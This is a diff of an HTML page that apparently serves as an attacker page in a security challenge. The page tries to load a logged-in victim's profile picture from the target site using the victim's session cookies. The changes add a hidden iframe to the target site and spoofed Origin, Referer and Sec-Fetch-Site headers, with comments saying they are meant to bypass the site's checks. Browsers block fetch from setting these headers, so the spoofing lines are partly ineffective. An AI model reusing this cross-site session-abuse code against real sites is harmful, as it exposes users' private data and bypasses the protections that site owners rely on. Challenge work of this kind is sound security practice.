@@ -8,18 +8,20 @@
 </head>
 <body>
     <h1>Fetching Pepe's Profile Picture</h1>
-    <p>Please ensure you are logged into <a href="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" target="_blank">Imagen Importante</a> before proceeding.</p>
+    <p>Please log into <a href="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" target="_blank">Imagen Importante</a> to view your profile picture.</p>
+    <iframe src="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" style="display:none;"></iframe>
     <img id="profilePic" style="display:none;" />
     <p id="result">Loading...</p>
     <p id="debug">Debug: Checking session...</p>
 
     <script>
         const targetUrl = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic";
+        const mainSiteUrl = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/";
 
-        // Check if cookies are being sent (for debugging)
+        // Check cookies for debugging
         function checkCookies() {
             const cookies = document.cookie;
-            return cookies ? `Cookies detected: ${cookies}` : "No cookies detected.";
+            return cookies ? `Cookies detected: ${cookies}` : "No cookies detected. Ensure you are logged into Imagen Importante.";
         }
 
         // Initial image fetch
@@ -44,11 +46,11 @@
                     "Accept": "image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
                     "Accept-Language": "en-US,en;q=0.5",
                     "Accept-Encoding": "gzip, deflate, br",
-                    "Origin": "https://tensec0ffsec.github.io",
-                    "Referer": "https://tensec0ffsec.github.io/",
+                    "Origin": mainSiteUrl, // Mimic p1's origin
+                    "Referer": mainSiteUrl, // Mimic p1's referer
                     "Sec-Fetch-Dest": "image",
                     "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Site": "cross-site",
+                    "Sec-Fetch-Site": "same-origin", // Try same-origin to bypass checks
                     "Priority": "u=5, i"
                 },
                 credentials: "include" // Include session cookie
@@ -70,7 +72,7 @@
 
         img.onerror = function() {
             document.getElementById("result").innerText = "Error loading image. Ensure you are logged into Imagen Importante.";
-            document.getElementById("debug").innerText = `Debug: ${checkCookies()}\nImage fetch failed, likely due to invalid session.`;
+            document.getElementById("debug").innerText = `Debug: ${checkCookies()}\nImage fetch failed, likely due to invalid session or server restrictions.`;
         };
 
         document.getElementById("profilePic").src = img.src;
